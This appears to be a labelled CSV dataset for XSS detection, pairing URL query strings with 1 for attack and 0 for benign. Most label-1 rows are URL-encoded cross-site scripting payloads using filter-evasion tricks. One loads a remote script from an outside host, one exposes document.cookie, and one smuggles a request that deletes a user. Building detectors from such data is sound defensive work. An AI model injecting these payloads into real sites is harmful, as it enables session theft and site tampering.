text,label
/46854?tz=%3Cscript%3E%28%7Bset/%2A%2A/%24%28%24%29%7B_/%2A%2A/setter%3D%24%2C_%3Djavascript%3Aalert%281%29%7D%7D%29.%24%3Deval%3C/script%3E,1
/17923?tcp=%3Cimg%20src%3D%22javascript%3Aalert%281%29%22%3E,1
/89101?feedback=ABC%3Cdiv%20style%3D%22x%3Aexpression%5Cx00%28javascript%3Aalert%281%29%22%3EDEF,1
/8568?u8=u8,0
/21513?maxprocperip=%3Cimg/%26%2309%3B%26%2310%3B%26%2311%3B%20src%3D%60~%60%20onerror%3Dprompt%281%29%3E,1
/49377?saveandnext=saveandnext,0
/gigabyte?airdate=airdate,0
/termine?link1=%3Ca%20href%3D%22%5Cx0Djavascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/coastal?ftpuser=ftpuser,0
/RBR?b=%3Cbody%20onload%21%23%24%25%26%28%29%2A~%2B-_.%2C%3A%3B%3F%40%5B/%7C%5C%5D%5E%60%3Ddocument.vulnerable%3Dtrue%3B%3E,1
/opposition?NetworkPlatform=NetworkPlatform,0
/2886?min=min,0
/TOPSTORIES?formatdown=formatdown,0
/PlusHome?toolbar=toolbar,0
/E-ditor_v3?searchby=%26lt%3BIMG%20SRC%3D%26quot%3Bjavascript%3Aalert%28%26apos%3BXSS%26apos%3B%29%26quot%3B,1
/survivaltime?ver=ver,0
/2360?dir=dir,0
/anniversary?marked=%3Ca%20href%3D%22%5CxE2%5Cx80%5CxA8javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/2003-03?archiveDate=archiveDate,0
/INDIA?quizid=quizid,0
/Projekte?harddiskstandby=harddiskstandby,0
/cospace1_small?feed=feed,0
/ZoneMinder-1?deL=%3CSCRIPT%3Edocument.write%28%22%3CSCRI%22%29%3B%3C/SCRIPT%3EPT%20SRC%3D%22http%3A//ha.ckers.org/xss.js%22%3E%3C/SCRIPT%3E,1
/forget?vhid=%3Ciframe//%20src%3DjavaSCRIPT%26colon%3Balert%281%29,1
/topicbiotech?abstract=%26%23X0003c%3B,1
/appdev?salesrank=%3Cbody%20src%3D1%20href%3D1%20onerror%3D%22javascript%3Aalert%281%29%22%3E%3C/body%3E,1
/info_maps?hidem=%3Cstyle%3E.XSS%7Bbackground-image%3Aurl%28%22javascript%3Adocument.vulnerable%3Dtrue%22%29%3B%7D%3C/STYLE%3E%3CA%20CLASS%3DXSS%3E%3C/a%3E,1
/bestfunds?domaiN=%3Cobject%20onError%20object%20onError%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/object%20onError%3E,1
/articleindex?skipIOS=skipIOS,0
/26635?authorize=%22%60%27%3E%3Cscript%3E%5CxE2%5Cx80%5Cx81javascript%3Aalert%281%29%3C/script%3E,1
/SIP?samemix=%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29//%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C/SCRIPT%3E,1
/instructions?shadow=shadow,0
/2006_images?filenamepattern=filenamepattern,0
/tip?hours=%26lt%3B%3F%20echo%28%26apos%3B%26lt%3BSCR%29%26apos%3B%3B,1
/recover?resultid=%3Cscript%5Cx0Dtype%3D%22text/javascript%22%3Ejavascript%3Aalert%281%29%3B%3C/script%3E,1
/3191?sqlpass1=%3CTABLE%20BACKGROUND%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E,1
/01-020?qtranslateincompatiblemessage=%22%60%27%3E%3Cscript%3E%5CxE2%5Cx80%5Cx85javascript%3Aalert%281%29%3C/script%3E,1
/5247?cms=cms,0
/pov?siteurl=%3Cscript%20onLoad%20script%20onLoad%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/script%20onLoad%3E,1
/brin?retries=%3Cscript%20/%2A%2A%2A/%3E/%2A%2A%2A/confirm%28%27%5CuFF41%5CuFF4C%5CuFF45%5CuFF52%5CuFF54%5Cu1455%5CuFF11%5Cu1450%27%29/%2A%2A%2A/%3C/script%20/%2A%2A%2A/,1
/23466?forum=%3Cdiv/onmouseover%3D%27alert%281%29%27%3E%20style%3D%22x%3A%22%3E,1
/35833?wins2=%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3Burl%3Djavascript%3Aconfirm%281%29%22%3E,1
/aboOverview?blastname=blastname,0
/2172430?proxyhost=proxyhost,0
/header-language01?totalcount=%3CIMG%20SRC%3D%60javascript%3Ajavascript%3Aalert%281%29%60%3E,1
/16908?FIELDNAMES=FIELDNAMES,0
/downloads3?unban=%26lt%3BIMG%20SRC%3D%5C%22jav%26%23x0A%3Bascript%26%23058%3Balert%28%27XSS%27%29%3B%5C%22%26gt%3B,1
/0788?transStatus=transStatus,0
/kms_small?delstring=//%3Cform/action%3Djavascript%26%23x3A%3Balert%26lpar%3Bdocument%26period%3Bcookie%26rpar%3B%3E%3Cinput/type%3D%27submit%27%3E//,1
/55087?mbname=%3Cbody%20oninput%3Djavascript%3Aalert%281%29%3E%3Cinput%20autofocus%3E,1
/office_locations?compress=compress,0
/Features_Front?sesskey=%3CXSS%20STYLE%3D%22xss%3Aexpression%28alert%28%27XSS%27%29%29%22%3E,1
/rosko?groupName=groupName,0
/Submit?City=City,0
/safety?budget=budget,0
/0223?receipient=%3Cimg%20src%5Cx10%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,1
/F01?spoiler=%3Cscript%20src%3D%22%5C%5C%25%28jscript%29s%22%3E%3C/script%3E,1
/economie?u18=%26lt%3B/BODY%26gt%3B%26lt%3B/HTML%26gt%3B,1
/001014?df=%3Cform%3E%3Ctextarea%20%26%2313%3B%20onkeyup%3D%27%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074%26%23x28%3B1%26%23x29%3B%27%3E,1
/State?dhcpleaseinlocaltime=%3Ca/href%3D%22javascript%3A%26%2313%3B%20javascript%3Aprompt%281%29%22%3E%3Cinput%20type%3D%22X%22%3E,1
/061211?docid=docid,0
/corporate_information?cuenta=cuenta,0
/3191?calendarid=calendarid,0
/4743?sqlport3=sqlport3,0
/fips185?exportImages=%22%3E%3Cimg%20src%3Dx%20onerror%3Djavascript%3Aalert%28A%29%3E,1
/tomtom?subtype=subtype,0
/hydrocodone-vicodin?fileext=fileext,0
/61786?moduleorder=moduleorder,0
/mre?xjxargs=xjxargs,0
/chandler?newDirectory=%3Cinput%20onblur%3Dwrite%28XSS%29%20autofocus%3E%3Cinput%20autofocus%3E,1
/1291?fname=%3CIMG%20onmouseover%3D%22alert%28%27xxs%27%29%22%3E,1
/15391?smfdbu=smfdbu,0
/20961?redfi=redfi,0
/teenagers?quickmod=%3CIMG%20SRC%3D%E2%80%9Djav%20ascript%3Aalert%28%E2%80%98XSS%E2%80%99%29%3B%E2%80%9D%3E,1
/gb-uk?cached=cached,0
/topicbsd?nolimit=%252BADw-script%2BAD4-alert%28document.location%29%252BADw-/script%252BAD4-,1
/2305?fallback=fallback,0
/perlcd?regDate=%3Cimg%20src/onerror%3Dprompt%288%29%3E,1
/CloneDVD2?Menu=%3CSCRIPT%20SRC%3D%25%28jscript%29s%3F%3CB%3E,1
/deborah?shortname=%26lt%3BA%20HREF%3D%5C%22htt%20p%26%2358%3B//6%206%26%2346%3B000146%26%2346%3B0x7%26%2346%3B147/%5C%22%26gt%3BXSS%26lt%3B/A%26gt%3B,1
/ntn?control=control,0
/913?richtext=Redirect%20302%20/a%26%2346%3Bjpg%20http%26%2358%3B//victimsite%26%2346%3Bcom/admin%26%2346%3Basp%26deleteuser,1
/30864?usermail=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%3F%3E%3Cfoo%3E%3C%21%5BCDATA%5B%3C%5D%5D%3ESCRIPT%3C%21%5BCDATA%5B%3E%5D%5D%3Ealert%28%27gotcha%27%29%3B%3C%21%5BCDATA%5B%3C%5D%5D%3E/SCRIPT%3C%21%5BCDATA%5B%3E%5D%5D%3E%3C/foo%3E,1
/15564?filE=filE,0
/30663?deletecntlist=%3Chtml%20onMouseOver%20html%20onMouseOver%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/html%20onMouseOver%3E,1
/Egypt?mins=%3Cmarquee%20onStart%20marquee%20onStart%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/marquee%20onStart%3E,1
/52525?where=%3CXSS%20STYLE%3D%22behavior%3A%20url%28%25%28htc%29s%29%3B%22%3E,1
/E70?uploaddir=%26lt%3BIMG%20DYNSRC%3D%26quot%3Bjavascript%3Aalert%28%26apos%3BXSS%26apos%3B%29%3B%26quot%3B%26gt%3B,1
/eBayLogoTM?itemID=%3Cscript%3Ejavascript%3Aalert%281%29%3C/script%5Cx0A,1
/srch?NSFX=%26lt%3BA%20HREF%3D%5C%22http%26%2358%3B//0x42%26%2346%3B0x0000066%26%2346%3B0x7%26%2346%3B0x93/%5C%22%26gt%3BXSS%26lt%3B/A%26gt%3B,1
/marym?radiusip3=radiusip3,0
/0764578014?UserCreateForm=UserCreateForm,0
/gartner?minimum=minimum,0
/MediaInfo?id37level=id37level,0
/76287?txtRecallBuffer=txtRecallBuffer,0
/0899?regenerate=regenerate,0
/poetry?subscription=subscription,0
/Christmas?Condition=%26lt%3BIMG%26%23x0D%3BSRC%26%23x0D%3B%3D%26%23x0D%3B%26quot%3B%26%23x0D%3Bj%26%23x0D%3Ba%26%23x0D%3Bv%26%23x0D%3Ba%26%23x0D%3Bs%26%23x0D%3Bc%26%23x0D%3Br%26%23x0D%3Bi%26%23x0D%3Bp%26%23x0D%3Bt%26%23x0D%3B%3A%26%23x0D%3Ba%26%23x0D%3Bl%26%23x0D%3Be%26%23x0D%3Br%26%23x0D%3Bt%26%23x0D%3B%28%26%23x0D%3B%26apos%3B%26%23x0D%3BX%26%23x0D%3BS%26%23x0D%3BS%26%23x0D%3B%26apos%3B%26%23x0D%3B%29%26%23x0D%3B%26quot%3B%26%23x0D%3B%26gt%3B%26%23x0D%3B,1
